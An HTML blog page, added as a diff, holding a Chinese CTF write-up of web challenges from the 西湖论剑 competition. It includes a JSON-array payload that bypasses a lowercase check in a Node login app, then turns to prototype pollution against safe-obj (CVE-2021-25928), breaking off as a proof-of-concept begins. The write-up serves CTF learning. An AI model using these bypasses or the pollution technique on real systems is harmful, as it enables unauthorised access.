@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>西湖论剑 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="西湖论剑">
+  <meta property="og:description" content="web 扭转乾坤 在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务
+想先上传试试
+Content-Type不能是 multipart/form-data
+这随便删了个字符就给了flag
+看师傅们都大写绕过,加空格绕过
+Node Magical Login 一个简单的用nodejs写的登录站点（貌似暗藏玄机）
+给了源码
+function LoginController(req,res) { try { const username = req.body.username const password = req.body.password if (username !== &#34;admin&#34; || password !== Math.random().toString()) { res.status(401).type(&#34;text/html&#34;).send(&#34;Login Failed&#34;) } else { res.cookie(&#34;user&#34;,SECRET_COOKIE) res.redirect(&#34;/flag1&#34;) } } catch (__) {} } /flag1的逻辑是要登录admin用户，但是密码是随机数肯定不能正常登录
+function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){ res.setHeader(&#34;This_Is_The_Flag1&#34;,flag1.toString().trim()) res.setHeader(&#34;This_Is_The_Flag2&#34;,flag2.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;Login success. Welcome,admin!&#34;) } if(req.cookies.user === &#34;admin&#34;) { res.setHeader(&#34;This_Is_The_Flag1&#34;, flag1.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;You Got One Part Of Flag!">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="西湖论剑">
+  <meta name="twitter:description" content="web 扭转乾坤 在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务
+想先上传试试
+Content-Type不能是 multipart/form-data
+这随便删了个字符就给了flag
+看师傅们都大写绕过,加空格绕过
+Node Magical Login 一个简单的用nodejs写的登录站点（貌似暗藏玄机）
+给了源码
+function LoginController(req,res) { try { const username = req.body.username const password = req.body.password if (username !== &#34;admin&#34; || password !== Math.random().toString()) { res.status(401).type(&#34;text/html&#34;).send(&#34;Login Failed&#34;) } else { res.cookie(&#34;user&#34;,SECRET_COOKIE) res.redirect(&#34;/flag1&#34;) } } catch (__) {} } /flag1的逻辑是要登录admin用户，但是密码是随机数肯定不能正常登录
+function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){ res.setHeader(&#34;This_Is_The_Flag1&#34;,flag1.toString().trim()) res.setHeader(&#34;This_Is_The_Flag2&#34;,flag2.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;Login success. Welcome,admin!&#34;) } if(req.cookies.user === &#34;admin&#34;) { res.setHeader(&#34;This_Is_The_Flag1&#34;, flag1.toString().trim()) res.status(200).type(&#34;text/html&#34;).send(&#34;You Got One Part Of Flag!">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "西湖论剑",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91\/"
+        },"genre": "posts","keywords": "","wordcount":  763 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">西湖论剑</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;763 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#扭转乾坤">扭转乾坤</a></li>
+    <li><a href="#node-magical-login">Node Magical Login</a></li>
+    <li><a href="#real_ez_node">real_ez_node</a></li>
+    <li><a href="#unusual-php">unusual php</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#签到">签到</a></li>
+    <li><a href="#mp3">mp3</a></li>
+    <li><a href="#take_the_zip_easy">take_the_zip_easy</a></li>
+    <li><a href="#机你太美">机你太美</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web">web</h1>
+<h2 id="扭转乾坤">扭转乾坤</h2>
+<blockquote>
+<p>在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务</p>
+</blockquote>
+<!-- raw HTML omitted -->
+<p>想先上传试试</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022026467.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022026467.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022026467.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022026467.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022026467.png"
+        title="image-20230202202643390" /></p>
+<p>Content-Type不能是 multipart/form-data</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022027958.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022027958.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022027958.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022027958.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022027958.png"
+        title="image-20230202202725925" /></p>
+<p>这随便删了个字符就给了flag</p>
+<p>看师傅们都大写绕过,加空格绕过</p>
+<h2 id="node-magical-login">Node Magical Login</h2>
+<blockquote>
+<p>一个简单的用nodejs写的登录站点（貌似暗藏玄机）</p>
+</blockquote>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022029685.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022029685.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022029685.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022029685.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022029685.png"
+        title="image-20230202202937642" /></p>
+<p>给了源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">LoginController</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Login Failed&#34;</span>)
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">cookie</span>(<span style="color:#e6db74">&#34;user&#34;</span>,<span style="color:#a6e22e">SECRET_COOKIE</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/flag1&#34;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">__</span>) {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>/flag1的逻辑是要登录admin用户，但是密码是随机数肯定不能正常登录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Flag1Controller</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">SECRET_COOKIE</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;This_Is_The_Flag1&#34;</span>,<span style="color:#a6e22e">flag1</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>())
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;This_Is_The_Flag2&#34;</span>,<span style="color:#a6e22e">flag2</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>())
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Login success. Welcome,admin!&#34;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;This_Is_The_Flag1&#34;</span>, <span style="color:#a6e22e">flag1</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>())
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;You Got One Part Of Flag! Try To Get Another Part of Flag!&#34;</span>)
+</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">401</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Unauthorized&#34;</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">__</span>) {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>往后看发现输出flag1 要满足<code>cookies.user === &quot;admin&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022057329.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022057329.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022057329.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022057329.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022057329.png"
+        title="image-20230202205759280" /></p>
+<p>构造user=admin</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">CheckController</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">checkcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">checkcode</span><span style="color:#f92672">?</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">checkcode</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1234</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">checkcode</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">16</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">checkcode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">checkcode</span>.<span style="color:#a6e22e">toLowerCase</span>()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">checkcode</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;aGr5AtSp55dRacer&#34;</span>){
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Invalid Checkcode1:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">checkcode</span>})
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">__</span>) {}
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;You Got Another Part Of Flag: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">flag2</span>.<span style="color:#a6e22e">toString</span>().<span style="color:#a6e22e">trim</span>()})
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;text/html&#34;</span>).<span style="color:#a6e22e">json</span>({<span style="color:#e6db74">&#34;msg&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Invalid Checkcode2:&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">checkcode</span>})
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>想要输出flag2,要满足<code>checkcode</code>在经过<code>toLowerCase()</code>转小写后 还是等于<code>aGr5AtSp55dRacer</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/getflag2&#34;</span>,(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>)=&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">controller</span>.<span style="color:#a6e22e">CheckController</span>(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>)
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>/getflag2是调用的路由</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022214050.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022214050.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022214050.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022214050.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202302022214050.png"
+        title="image-20230202221444979" /></p>
+<p>现在目的就是要绕过<code>toLowerCase()</code>并且保持长度为16,</p>
+<p>这个方法是把字符串转换为小写，</p>
+<p>看学长的思路，用json形式传入数组可以绕过</p>
+<pre tabindex="0"><code>{&#34;checkcode&#34;:[&#34;aGr5AtSp55dRacer&#34;,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}
+</code></pre><h2 id="real_ez_node">real_ez_node</h2>
+<p>此题类似[<a href="https://blog.csdn.net/cjdgg/article/details/119068329" target="_blank" rel="noopener noreffer">GYCTF2020]Node Game-nodejs</a>
+</p>
+<p>源码拿到 index.js</p>
+<p>先看/copy路由</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/copy&#39;</span>,(<span style="color:#a6e22e">req</span>,<span style="color:#a6e22e">res</span>)=&gt;{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#39;Content-type&#39;</span>,<span style="color:#e6db74">&#39;text/html;charset=utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">connection</span>.<span style="color:#a6e22e">remoteAddress</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">ip</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">ip</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">msg</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;only for admin&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">obj</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> 
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">index</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">index</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;__proto__&#34;</span>)){
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">safeobj</span>.<span style="color:#a6e22e">expand</span>(<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">index</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">index</span>])
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>);
+</span></span><span style="display:flex;"><span>})
+</span></span></code></pre></div><p>要求地址127.0.0.1访问 (req.connection.remoteAddress不能通过请求头来伪造的。可以考虑用SSRF来绕过）</p>
+<p>然后定义了<code>user</code>对象，并且禁掉了<code>__proto__</code>,可以使用<code>constructor.prototype</code>绕过，因为constructor.prototype也可以操作原型链 。</p>
+<p>然后是<code>safeobj.expand()</code>调用了<code>user</code>对象，考虑<code>safe-obj</code>原型链污染，网上搜到CVE-2021-25928</p>
+<p>测试一下poc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">safeObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;safe-obj&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {};
